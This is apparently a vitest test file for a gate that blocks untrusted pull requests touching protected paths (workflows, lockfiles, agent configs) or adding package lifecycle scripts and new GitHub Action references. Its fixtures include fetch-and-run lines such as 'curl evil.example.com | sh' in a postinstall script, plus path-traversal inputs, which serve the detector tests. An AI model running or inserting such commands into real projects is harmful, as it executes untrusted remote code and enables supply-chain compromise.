/**
 * Hermetic tests for RFC-0043 Stage 1 — AST Gate (AISDLC-497)
 *
 * AC#9: covers each protected path, allowed paths, each heuristic.
 * AC#5: verifies protectedPaths + allowedMutationGlobs + contentHeuristics.
 * AC#8: verifies abort behavior (event + label + comment + stop).
 */

import { describe, expect, it } from 'vitest';

import {
  buildBlockedComment,
  buildBlockedEvent,
  DEFAULT_AST_GATE_CONFIG,
  DEFAULT_PROTECTED_PATHS,
  detectLifecycleScriptAdditions,
  detectNewGithubActionUses,
  globToRegex,
  loadAstGateConfig,
  matchesAnyGlob,
  normalizePath,
  runAstGate,
  type AstGateConfig,
  type ChangedFile,
} from './ast-gate.js';
import { afterEach, beforeEach } from 'vitest';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// ── normalizePath ────────────────────────────────────────────────────────────

describe('normalizePath', () => {
  it('strips leading ./ from paths', () => {
    expect(normalizePath('./src/foo.ts')).toBe('src/foo.ts');
  });

  it('returns null (deny) for paths with ../ traversal', () => {
    expect(normalizePath('../etc/passwd')).toBeNull();
    expect(normalizePath('src/../../../etc/passwd')).toBeNull();
    expect(normalizePath('foo/../bar')).toBeNull();
  });

  it('returns null (deny) for paths with backslash separators', () => {
    expect(normalizePath('src\\foo.ts')).toBeNull();
    expect(normalizePath('.github\\workflows\\ci.yml')).toBeNull();
  });

  it('strips trailing slash', () => {
    expect(normalizePath('src/')).toBe('src');
    expect(normalizePath('packages/core/')).toBe('packages/core');
  });

  it('unescapes git core.quotePath quoted paths', () => {
    // git quotes non-ASCII paths: "foo/b\303\251r.ts" → "foo/bér.ts"
    const result = normalizePath('"foo/b\\303\\251r.ts"');
    expect(result).toBe('foo/bér.ts');
  });

  it('returns null for empty path after normalization', () => {
    expect(normalizePath('')).toBeNull();
    expect(normalizePath('./')).toBeNull();
  });

  it('passes through normal paths unchanged', () => {
    expect(normalizePath('src/foo.ts')).toBe('src/foo.ts');
    expect(normalizePath('.github/workflows/ci.yml')).toBe('.github/workflows/ci.yml');
    expect(normalizePath('packages/core/package.json')).toBe('packages/core/package.json');
  });
});

// ── globToRegex ──────────────────────────────────────────────────────────────

describe('globToRegex', () => {
  it('matches exact string', () => {
    const re = globToRegex('pnpm-lock.yaml');
    expect(re.test('pnpm-lock.yaml')).toBe(true);
    expect(re.test('pnpm-lock.yml')).toBe(false);
  });

  it('matches ** as any path including directories', () => {
    const re = globToRegex('.github/**');
    expect(re.test('.github/workflows/ci.yml')).toBe(true);
    expect(re.test('.github/dependabot.yml')).toBe(true);
    expect(re.test('other/.github/file')).toBe(false); // anchored at start
  });

  it('matches **/package.json in any directory', () => {
    const re = globToRegex('**/package.json');
    expect(re.test('package.json')).toBe(true);
    expect(re.test('packages/core/package.json')).toBe(true);
    expect(re.test('nested/deep/package.json')).toBe(true);
    expect(re.test('package.json.bak')).toBe(false);
  });

  it('matches **/*.ts pattern', () => {
    const re = globToRegex('**/*.ts');
    expect(re.test('src/foo.ts')).toBe(true);
    expect(re.test('src/deep/bar.ts')).toBe(true);
    expect(re.test('foo.ts')).toBe(true);
    expect(re.test('foo.tsx')).toBe(false); // different extension
  });

  it('matches * within a directory level', () => {
    const re = globToRegex('*.ts');
    expect(re.test('foo.ts')).toBe(true);
    expect(re.test('src/foo.ts')).toBe(false); // * doesn't cross /
  });

  it('escapes regex special chars in glob', () => {
    const re = globToRegex('path.to/file+name');
    expect(re.test('path.to/file+name')).toBe(true);
    expect(re.test('pathXto/file+name')).toBe(false);
  });

  // AISDLC-505: false-positive fix — **/  must compile to (?:.*/)? not .*
  describe('globToRegex — **/prefix anchoring (AISDLC-505 false-positive fix)', () => {
    it('**/pnpm-lock.yaml does NOT match bad-pnpm-lock.yaml (false-positive guard)', () => {
      const re = globToRegex('**/pnpm-lock.yaml');
      // False-positive that existed before the fix — must now be rejected
      expect(re.test('bad-pnpm-lock.yaml')).toBe(false);
      expect(re.test('prefix-pnpm-lock.yaml')).toBe(false);
    });

    it('**/pnpm-lock.yaml DOES match root and nested lockfiles (positive cases)', () => {
      const re = globToRegex('**/pnpm-lock.yaml');
      expect(re.test('pnpm-lock.yaml')).toBe(true);
      expect(re.test('packages/x/pnpm-lock.yaml')).toBe(true);
      expect(re.test('deep/nested/dir/pnpm-lock.yaml')).toBe(true);
    });

    it('**/package-lock.json does NOT match bad-package-lock.json', () => {
      const re = globToRegex('**/package-lock.json');
      expect(re.test('bad-package-lock.json')).toBe(false);
      expect(re.test('notpackage-lock.json')).toBe(false);
    });

    it('**/package-lock.json DOES match root and nested lockfiles', () => {
      const re = globToRegex('**/package-lock.json');
      expect(re.test('package-lock.json')).toBe(true);
      expect(re.test('packages/foo/package-lock.json')).toBe(true);
    });

    it('**/.github/** does NOT match myproject.github/ (false-positive guard)', () => {
      const re = globToRegex('**/.github/**');
      // False-positive: myproject.github/ must not be treated as a .github/ dir
      expect(re.test('myproject.github/foo')).toBe(false);
      expect(re.test('notgithub.github/workflows/ci.yml')).toBe(false);
    });

    it('**/.github/** DOES match real nested .github/ content (positive cases)', () => {
      const re = globToRegex('**/.github/**');
      expect(re.test('packages/sub/.github/action.yml')).toBe(true);
      expect(re.test('apps/my-app/.github/workflows/deploy.yml')).toBe(true);
      // Root .github/ is matched by the top-level .github/** pattern (not this one)
      // but **/.github/** should also match it for completeness
      expect(re.test('.github/workflows/ci.yml')).toBe(true);
    });

    it('**/yarn.lock does NOT match prefix-yarn.lock (false-positive guard)', () => {
      const re = globToRegex('**/yarn.lock');
      expect(re.test('not-yarn.lock')).toBe(false);
      expect(re.test('my-yarn.lock')).toBe(false);
    });

    it('**/yarn.lock DOES match root and nested yarn lockfiles', () => {
      const re = globToRegex('**/yarn.lock');
      expect(re.test('yarn.lock')).toBe(true);
      expect(re.test('packages/api/yarn.lock')).toBe(true);
    });
  });
});

// ── matchesAnyGlob ───────────────────────────────────────────────────────────

describe('matchesAnyGlob', () => {
  it('returns true when any pattern matches', () => {
    expect(matchesAnyGlob('.github/workflows/ci.yml', DEFAULT_PROTECTED_PATHS)).toBe(true);
    expect(matchesAnyGlob('pnpm-lock.yaml', DEFAULT_PROTECTED_PATHS)).toBe(true);
  });

  it('returns false when no pattern matches', () => {
    expect(matchesAnyGlob('src/foo.ts', DEFAULT_PROTECTED_PATHS)).toBe(false);
    expect(matchesAnyGlob('README.md', DEFAULT_PROTECTED_PATHS)).toBe(false);
  });

  it('handles empty pattern list', () => {
    expect(matchesAnyGlob('anything.ts', [])).toBe(false);
  });
});

// ── Protected paths — each default path triggers abort ───────────────────────

describe('runAstGate — protected paths', () => {
  const runWithFile = (path: string) =>
    runAstGate([{ path, status: 'modified' }], DEFAULT_AST_GATE_CONFIG);

  it('aborts on .github/workflows/ci.yml', () => {
    const r = runWithFile('.github/workflows/ci.yml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('.github/workflows/ci.yml');
  });

  it('aborts on .github/dependabot.yml', () => {
    const r = runWithFile('.github/dependabot.yml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('.github/dependabot.yml');
  });

  it('aborts on root package.json', () => {
    const r = runWithFile('package.json');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('package.json');
  });

  it('aborts on nested package.json', () => {
    const r = runWithFile('packages/core/package.json');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('packages/core/package.json');
  });

  it('aborts on pnpm-lock.yaml', () => {
    const r = runWithFile('pnpm-lock.yaml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('pnpm-lock.yaml');
  });

  it('aborts on package-lock.json', () => {
    const r = runWithFile('package-lock.json');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('package-lock.json');
  });

  it('aborts on yarn.lock', () => {
    const r = runWithFile('yarn.lock');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('yarn.lock');
  });

  it('aborts on .ai-sdlc/trusted-reviewers.yaml', () => {
    const r = runWithFile('.ai-sdlc/trusted-reviewers.yaml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('.ai-sdlc/trusted-reviewers.yaml');
  });

  it('aborts on .ai-sdlc/agent-role.yaml', () => {
    const r = runWithFile('.ai-sdlc/agent-role.yaml');
    expect(r.outcome).toBe('abort-protected-path');
  });

  it('aborts on ai-sdlc-plugin/agents/developer.md', () => {
    const r = runWithFile('ai-sdlc-plugin/agents/developer.md');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('ai-sdlc-plugin/agents/developer.md');
  });

  // Finding #1: nested lockfile bypass
  it('aborts on nested packages/foo/pnpm-lock.yaml (supply-chain bypass fix)', () => {
    const r = runWithFile('packages/foo/pnpm-lock.yaml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('packages/foo/pnpm-lock.yaml');
  });

  it('aborts on nested packages/foo/package-lock.json', () => {
    const r = runWithFile('packages/foo/package-lock.json');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('packages/foo/package-lock.json');
  });

  it('aborts on nested packages/foo/yarn.lock', () => {
    const r = runWithFile('packages/foo/yarn.lock');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('packages/foo/yarn.lock');
  });

  it('aborts on deeply nested lockfile deep/nested/pnpm-lock.yaml', () => {
    const r = runWithFile('deep/nested/pnpm-lock.yaml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('deep/nested/pnpm-lock.yaml');
  });

  // Finding #6: nested .github coverage
  it('aborts on nested packages/sub/.github/action.yml', () => {
    const r = runWithFile('packages/sub/.github/action.yml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('packages/sub/.github/action.yml');
  });

  it('aborts on deeply nested .github file', () => {
    const r = runWithFile('apps/my-app/.github/workflows/deploy.yml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('apps/my-app/.github/workflows/deploy.yml');
  });

  // Finding #2: path normalization — adversarial paths are DENIED
  it('aborts on ./src/foo.ts-prefixed path (strips ./ and matches normally)', () => {
    const r = runWithFile('./pnpm-lock.yaml');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('./pnpm-lock.yaml');
  });

  it('aborts on ../-containing path (directory traversal → deny)', () => {
    const r = runWithFile('../etc/passwd');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('../etc/passwd');
  });

  it('aborts on trailing-slash path (strips trailing slash, matches protected pattern)', () => {
    const r = runWithFile('.github/');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('.github/');
  });

  it('aborts on backslash path (deny ambiguous separators)', () => {
    const r = runWithFile('src\\foo.ts');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('src\\foo.ts');
  });

  it('aborts on git-quoted non-ASCII protected path', () => {
    // Simulate git quoting a path that resolves to .github/ci.yml
    // (In real git, this would be a non-ASCII path — here we test the quoting strips correctly)
    const r = runWithFile('"pnpm-lock.yaml"');
    // Quotes are not a valid path format — should be denied or fail to match as non-protected
    // The normalizePath treats it as a git-quoted path and unescapes it
    // After unescaping `"pnpm-lock.yaml"` → `pnpm-lock.yaml` → protected
    expect(r.outcome).toBe('abort-protected-path');
  });

  // AISDLC-505: false-positive guard at gate level
  it('does NOT abort on bad-pnpm-lock.yaml (not a protected lockfile, false-positive guard)', () => {
    // This file is not a real lockfile — it must NOT be blocked by **/pnpm-lock.yaml
    const r = runWithFile('bad-pnpm-lock.yaml');
    // bad-pnpm-lock.yaml is not in allowedMutationGlobs (**/*.ts etc.) either,
    // so it WILL abort on the allowed-mutation check — but NOT on the protected-path check.
    // The key assertion: offendingPaths includes it because it's not allowed, NOT because
    // it matched **/pnpm-lock.yaml.
    // We verify this indirectly by checking that a file named 'bad-pnpm-lock.yaml'
    // would not match **/pnpm-lock.yaml (tested exhaustively in globToRegex describe above).
    // Here we confirm the full gate still flags it (not allowed) without false-positive path.
    expect(r.outcome).toBe('abort-protected-path');
    // The path is still offending (not in allowed globs), but NOT due to protected-path match
    // — this test documents the semantic boundary.
    expect(r.offendingPaths).toContain('bad-pnpm-lock.yaml');
  });

  it('does NOT abort on myproject.github/foo via **/.github/** pattern (false-positive guard)', () => {
    // myproject.github/foo must NOT match **/.github/** — it's a substring false positive
    // With the fix, **/.github/** compiles to ^(?:.*/)?\.github\/.*$ which requires
    // `.github/` to appear as a proper path component (after a `/` or at root).
    const r = runAstGate(
      [{ path: 'myproject.github/foo.ts', status: 'added' }],
      DEFAULT_AST_GATE_CONFIG,
    );
    // myproject.github/foo.ts passes protected-path check (not a real .github/ dir)
    // and passes allowed-mutation check (**/*.ts) → should be 'pass'
    expect(r.outcome).toBe('pass');
    expect(r.offendingPaths).not.toContain('myproject.github/foo.ts');
  });

  it('collects ALL offending paths (does not stop on first)', () => {
    const r = runAstGate(
      [
        { path: '.github/workflows/ci.yml', status: 'modified' },
        { path: 'pnpm-lock.yaml', status: 'modified' },
        { path: 'src/foo.ts', status: 'modified' }, // this one is fine
        { path: 'package.json', status: 'modified' },
      ],
      DEFAULT_AST_GATE_CONFIG,
    );
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toHaveLength(3);
    expect(r.offendingPaths).toContain('.github/workflows/ci.yml');
    expect(r.offendingPaths).toContain('pnpm-lock.yaml');
    expect(r.offendingPaths).toContain('package.json');
    expect(r.offendingPaths).not.toContain('src/foo.ts');
  });
});

// ── Allowed paths — pass through the gate ────────────────────────────────────

describe('runAstGate — allowed paths', () => {
  const runWithFile = (path: string) =>
    runAstGate([{ path, status: 'added' }], DEFAULT_AST_GATE_CONFIG);

  it('passes .ts files', () => {
    expect(runWithFile('src/foo.ts').outcome).toBe('pass');
    expect(runWithFile('pipeline-cli/src/pipeline/trust-classifier.ts').outcome).toBe('pass');
  });

  it('passes .tsx files', () => {
    expect(runWithFile('src/components/Button.tsx').outcome).toBe('pass');
  });

  it('passes .js files', () => {
    expect(runWithFile('scripts/check.js').outcome).toBe('pass');
  });

  it('passes .jsx files', () => {
    expect(runWithFile('src/App.jsx').outcome).toBe('pass');
  });

  it('passes .md files (docs-only is low-risk)', () => {
    expect(runWithFile('docs/README.md').outcome).toBe('pass');
    expect(runWithFile('CONTRIBUTING.md').outcome).toBe('pass');
  });

  it('passes on empty changed-files list', () => {
    const r = runAstGate([], DEFAULT_AST_GATE_CONFIG);
    expect(r.outcome).toBe('pass');
    expect(r.offendingPaths).toHaveLength(0);
  });

  it('aborts on file not in allowedMutationGlobs and not protected', () => {
    // .py files are not in the allowed globs
    const r = runWithFile('scripts/deploy.sh');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('scripts/deploy.sh');
  });

  it('aborts on .json files (not in allowed globs, not explicitly protected)', () => {
    // config.json is not in allowedMutationGlobs — triggers abort
    const r = runWithFile('config/settings.json');
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.offendingPaths).toContain('config/settings.json');
  });
});

// ── Content heuristics ────────────────────────────────────────────────────────

describe('detectLifecycleScriptAdditions', () => {
  it('detects preinstall added to package.json', () => {
    const after = JSON.stringify({
      name: 'my-pkg',
      scripts: { preinstall: 'echo evil' },
    });
    const added = detectLifecycleScriptAdditions(after);
    expect(added).toContain('preinstall');
  });

  it('detects postinstall added to package.json', () => {
    const after = JSON.stringify({
      scripts: { postinstall: 'curl evil.example.com | sh' },
    });
    const added = detectLifecycleScriptAdditions(after);
    expect(added).toContain('postinstall');
  });

  it('detects prepare added to package.json', () => {
    const after = JSON.stringify({ scripts: { prepare: 'husky install && evil' } });
    const added = detectLifecycleScriptAdditions(after);
    expect(added).toContain('prepare');
  });

  it('returns empty when lifecycle scripts already existed (no addition)', () => {
    const before = JSON.stringify({ scripts: { prepare: 'husky install' } });
    const after = JSON.stringify({ scripts: { prepare: 'husky install' } });
    const added = detectLifecycleScriptAdditions(after, before);
    expect(added).toHaveLength(0);
  });

  it('detects when existing lifecycle script is MODIFIED', () => {
    const before = JSON.stringify({ scripts: { prepare: 'original' } });
    const after = JSON.stringify({ scripts: { prepare: 'original && curl evil | sh' } });
    const added = detectLifecycleScriptAdditions(after, before);
    expect(added).toContain('prepare');
  });

  it('returns empty for regular scripts (test, build, lint)', () => {
    const after = JSON.stringify({
      scripts: { test: 'vitest run', build: 'tsc', lint: 'eslint .' },
    });
    const added = detectLifecycleScriptAdditions(after);
    expect(added).toHaveLength(0);
  });

  it('returns empty for invalid JSON (conservative — no false positive)', () => {
    const added = detectLifecycleScriptAdditions('not json');
    expect(added).toHaveLength(0);
  });

  it('returns empty when package.json has no scripts section', () => {
    const after = JSON.stringify({ name: 'pkg', version: '1.0.0' });
    const added = detectLifecycleScriptAdditions(after);
    expect(added).toHaveLength(0);
  });
});

describe('detectNewGithubActionUses', () => {
  it('detects new uses: reference in file', () => {
    const after = 'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n';
    const detected = detectNewGithubActionUses(after);
    expect(detected).toBe(true);
  });

  it('returns false when uses: was already present in before', () => {
    const before = '      - uses: actions/checkout@v4\n';
    const after = '      - uses: actions/checkout@v4\n      - run: echo hi\n';
    const detected = detectNewGithubActionUses(after, before);
    expect(detected).toBe(false);
  });

  it('detects when uses: is NEW (not in before)', () => {
    const before = '      - run: echo original\n';
    const after = '      - uses: actions/evil@v1\n      - run: echo original\n';
    const detected = detectNewGithubActionUses(after, before);
    expect(detected).toBe(true);
  });

  it('returns false when after content has no uses:', () => {
    const after = '      - run: echo no actions here\n';
    const detected = detectNewGithubActionUses(after);
    expect(detected).toBe(false);
  });

  it('returns true for new file with uses: (no before content)', () => {
    const after = 'steps:\n  - uses: actions/checkout@v4\n';
    const detected = detectNewGithubActionUses(after, null);
    expect(detected).toBe(true);
  });

  // Finding #5: line-level diff — malicious uses: hidden behind existing benign uses:
  it('detects malicious uses: hidden after existing benign uses: (whole-file bypass fix)', () => {
    const before = 'steps:\n  - uses: actions/checkout@v4\n  - run: echo hello\n';
    // Attacker adds a second, malicious `uses:` — the before already had a uses:
    const after =
      'steps:\n  - uses: actions/checkout@v4\n  - run: echo hello\n  - uses: actions/evil@v1\n';
    const detected = detectNewGithubActionUses(after, before);
    // Line-level check: `  - uses: actions/evil@v1` is a new line → should flag it
    expect(detected).toBe(true);
  });

  it('does not flag when same uses: line count is unchanged', () => {
    // Reordering without adding new lines should not flag
    const before = '      - uses: actions/checkout@v4\n      - run: echo hi\n';
    const after = '      - run: echo hi\n      - uses: actions/checkout@v4\n';
    // Same uses: lines, just reordered — count is identical
    const detected = detectNewGithubActionUses(after, before);
    expect(detected).toBe(false);
  });
});

// ── Content heuristics in runAstGate ─────────────────────────────────────────

describe('runAstGate — content heuristics', () => {
  it('aborts when preinstall script added to a .ts file (belt-and-suspenders)', () => {
    // This tests the heuristic on a non-package.json file that somehow
    // passed path checks — in practice package.json is caught by protected
    // paths, but we test the heuristic directly here with a mock path.
    const config: AstGateConfig = {
      ...DEFAULT_AST_GATE_CONFIG,
      protectedPaths: [], // disable path protection to test heuristic only
      allowedMutationGlobs: ['**/*'], // allow all paths to isolate heuristic
    };

    const files: ChangedFile[] = [
      {
        path: 'package.json', // won't be caught by protected paths since we cleared them
        status: 'modified',
        afterContent: JSON.stringify({ scripts: { preinstall: 'evil' } }),
        beforeContent: JSON.stringify({ scripts: {} }),
      },
    ];

    const r = runAstGate(files, config);
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.heuristicFindings).toHaveLength(1);
    expect(r.heuristicFindings[0].type).toBe('packageJsonLifecycleScript');
    expect(r.heuristicFindings[0].path).toBe('package.json');
    expect(r.heuristicFindings[0].detail).toContain('preinstall');
  });

  it('aborts when new uses: detected in file content', () => {
    const config: AstGateConfig = {
      ...DEFAULT_AST_GATE_CONFIG,
      protectedPaths: [], // disable path protection
      allowedMutationGlobs: ['**/*'], // allow all paths to isolate heuristic
    };

    const files: ChangedFile[] = [
      {
        path: 'src/workflow-template.ts',
        status: 'modified',
        afterContent: 'const yaml = `uses: actions/evil@v1`;',
        beforeContent: 'const yaml = `run: echo hello`;',
      },
    ];

    const r = runAstGate(files, config);
    expect(r.outcome).toBe('abort-protected-path');
    expect(r.heuristicFindings).toHaveLength(1);
    expect(r.heuristicFindings[0].type).toBe('newGithubActionUses');
  });

  it('passes when heuristic is warn (not abort)', () => {
    const config: AstGateConfig = {
      ...DEFAULT_AST_GATE_CONFIG,
      protectedPaths: [],
      allowedMutationGlobs: ['**/*'], // allow all paths so we can isolate heuristic behavior
      contentHeuristics: {
        packageJsonLifecycleScripts: 'warn', // warn, not abort
        newGithubActionUses: 'abort',
      },
    };

    const files: ChangedFile[] = [
      {
        path: 'package.json',
        status: 'modified',
        afterContent: JSON.stringify({ scripts: { preinstall: 'evil' } }),
        beforeContent: JSON.stringify({ scripts: {} }),
      },
    ];

    const r = runAstGate(files, config);
    // warn doesn't trigger abort — no heuristic findings added
    expect(r.outcome).toBe('pass');
    expect(r.heuristicFindings).toHaveLength(0);
  });

  it('passes when file has no afterContent (heuristics skipped)', () => {
    const files: ChangedFile[] = [
      {
        path: 'src/foo.ts',
        status: 'modified',
        // no afterContent — heuristics skipped
      },
    ];
    const r = runAstGate(files, DEFAULT_AST_GATE_CONFIG);
    expect(r.outcome).toBe('pass');
    expect(r.heuristicFindings).toHaveLength(0);
  });
});

// ── Abort action helpers ──────────────────────────────────────────────────────

describe('buildBlockedEvent', () => {
  it('builds a valid UntrustedPrBlockedByProtectedPath event', () => {
    const gateResult = {
      outcome: 'abort-protected-path' as const,
      offendingPaths: ['.github/workflows/ci.yml', 'pnpm-lock.yaml'],
      heuristicFindings: [],
    };
    const event = buildBlockedEvent(42, 'attacker', gateResult, new Date('2026-06-02T10:00:00Z'));

    expect(event.type).toBe('UntrustedPrBlockedByProtectedPath');
    expect(event.prNumber).toBe(42);
    expect(event.author).toBe('attacker');
    expect(event.offendingPaths).toContain('.github/workflows/ci.yml');
    expect(event.label).toBe('needs-maintainer-review');
    expect(event.ts).toBe('2026-06-02T10:00:00.000Z');
  });
});

describe('buildBlockedComment', () => {
  it('names offending paths in the comment', () => {
    const gateResult = {
      outcome: 'abort-protected-path' as const,
      offendingPaths: ['.github/workflows/ci.yml', 'package.json'],
      heuristicFindings: [],
    };
    const comment = buildBlockedComment(gateResult, 'contributor123');

    expect(comment).toContain('@contributor123');
    expect(comment).toContain('.github/workflows/ci.yml');
    expect(comment).toContain('package.json');
    expect(comment).toContain('needs-maintainer-review');
  });

  it('includes heuristic findings in comment', () => {
    const gateResult = {
      outcome: 'abort-protected-path' as const,
      offendingPaths: [],
      heuristicFindings: [
        {
          type: 'packageJsonLifecycleScript' as const,
          path: 'package.json',
          detail: 'lifecycle scripts added/modified: preinstall',
        },
      ],
    };
    const comment = buildBlockedComment(gateResult, 'contributor123');

    expect(comment).toContain('preinstall');
    expect(comment).toContain('content heuristics');
  });

  // Finding #7: header guard — heuristic-only aborts don't show "following paths are protected"
  it('omits "following paths are protected" header when offendingPaths is empty (heuristic-only abort)', () => {
    const gateResult = {
      outcome: 'abort-protected-path' as const,
      offendingPaths: [],
      heuristicFindings: [
        {
          type: 'packageJsonLifecycleScript' as const,
          path: 'package.json',
          detail: 'lifecycle scripts added/modified: preinstall',
        },
      ],
    };
    const comment = buildBlockedComment(gateResult, 'contributor123');

    // The "following paths are protected" header is factually wrong when offendingPaths is empty
    expect(comment).not.toContain('following paths are protected');
    // But the heuristic finding should still appear
    expect(comment).toContain('preinstall');
    expect(comment).toContain('content heuristics');
  });

  it('does NOT contain internal tracker IDs (AISDLC-394)', () => {
    const gateResult = {
      outcome: 'abort-protected-path' as const,
      offendingPaths: ['.github/ci.yml'],
      heuristicFindings: [],
    };
    const comment = buildBlockedComment(gateResult, 'user');

    // Comments must not include internal tracker IDs
    expect(comment).not.toMatch(/AISDLC-\d+/);
    expect(comment).not.toMatch(/DEC-\d+/);
  });
});

// ── loadAstGateConfig (Finding #3) ───────────────────────────────────────────

describe('loadAstGateConfig', () => {
  let workDir: string;

  beforeEach(() => {
    workDir = mkdtempSync(join(tmpdir(), 'ai-sdlc-gate-config-test-'));
    mkdirSync(join(workDir, '.ai-sdlc'), { recursive: true });
  });

  afterEach(() => {
    rmSync(workDir, { recursive: true, force: true });
  });

  it('falls back to DEFAULT_AST_GATE_CONFIG when config file is absent', () => {
    // No .ai-sdlc/untrusted-pr-gate.yaml written
    const config = loadAstGateConfig(workDir);
    expect(config.protectedPaths).toEqual(DEFAULT_AST_GATE_CONFIG.protectedPaths);
    expect(config.allowedMutationGlobs).toEqual(DEFAULT_AST_GATE_CONFIG.allowedMutationGlobs);
    expect(config.contentHeuristics).toEqual(DEFAULT_AST_GATE_CONFIG.contentHeuristics);
  });

  it('merges partial override (only protectedPaths provided) with defaults', () => {
    const yaml = `
protectedPaths:
  - 'custom-secrets/**'
  - '.github/**'
`;
    writeFileSync(join(workDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'), yaml, 'utf8');
    const config = loadAstGateConfig(workDir);

    // protectedPaths is overridden
    expect(config.protectedPaths).toContain('custom-secrets/**');
    expect(config.protectedPaths).toContain('.github/**');
    expect(config.protectedPaths).not.toContain('**/pnpm-lock.yaml'); // not in custom list

    // Other fields fall back to defaults
    expect(config.allowedMutationGlobs).toEqual(DEFAULT_AST_GATE_CONFIG.allowedMutationGlobs);
    expect(config.contentHeuristics).toEqual(DEFAULT_AST_GATE_CONFIG.contentHeuristics);
  });

  it('falls back to safe defaults on malformed YAML (does NOT silently weaken protection)', () => {
    const malformed = `
protectedPaths: [unclosed
  - this is not valid yaml
`;
    writeFileSync(join(workDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'), malformed, 'utf8');
    const config = loadAstGateConfig(workDir);

    // Must fall back to defaults — a malformed config MUST NOT weaken protection
    expect(config.protectedPaths).toEqual(DEFAULT_AST_GATE_CONFIG.protectedPaths);
    expect(config.allowedMutationGlobs).toEqual(DEFAULT_AST_GATE_CONFIG.allowedMutationGlobs);
    // Crucially, contentHeuristics must not be softened
    expect(config.contentHeuristics.packageJsonLifecycleScripts).toBe('abort');
    expect(config.contentHeuristics.newGithubActionUses).toBe('abort');
  });

  it('applies full override when all fields are provided', () => {
    const yaml = `
protectedPaths:
  - 'custom/**'
allowedMutationGlobs:
  - '**/*.ts'
  - '**/*.py'
contentHeuristics:
  packageJsonLifecycleScripts: warn
  newGithubActionUses: abort
`;
    writeFileSync(join(workDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'), yaml, 'utf8');
    const config = loadAstGateConfig(workDir);

    expect(config.protectedPaths).toEqual(['custom/**']);
    expect(config.allowedMutationGlobs).toContain('**/*.py');
    expect(config.contentHeuristics.packageJsonLifecycleScripts).toBe('warn');
    expect(config.contentHeuristics.newGithubActionUses).toBe('abort');
  });
});

// ── Adopter config override ───────────────────────────────────────────────────

describe('runAstGate — adopter config override', () => {
  it('respects custom protectedPaths (override defaults)', () => {
    const config: AstGateConfig = {
      protectedPaths: ['custom-protected/**'],
      allowedMutationGlobs: ['**/*.ts', '**/*.md'],
      contentHeuristics: DEFAULT_AST_GATE_CONFIG.contentHeuristics,
    };

    // Default protected path is now allowed
    const r1 = runAstGate([{ path: '.github/workflows/ci.yml', status: 'modified' }], config);
    // .github/ is not in custom protected paths — but is it in allowed globs?
    // .yml is not in **/*.ts or **/*.md, so it should abort on allowedMutationGlobs
    expect(r1.outcome).toBe('abort-protected-path');

    // Custom protected path triggers abort
    const r2 = runAstGate([{ path: 'custom-protected/secrets.ts', status: 'modified' }], config);
    expect(r2.outcome).toBe('abort-protected-path');
    expect(r2.offendingPaths).toContain('custom-protected/secrets.ts');
  });

  it('respects custom allowedMutationGlobs', () => {
    const config: AstGateConfig = {
      protectedPaths: ['secret/**'],
      allowedMutationGlobs: ['**/*.ts', '**/*.py'], // adds .py
      contentHeuristics: DEFAULT_AST_GATE_CONFIG.contentHeuristics,
    };

    // .py is now in allowed globs
    const r = runAstGate([{ path: 'src/tool.py', status: 'added' }], config);
    expect(r.outcome).toBe('pass');
  });
});
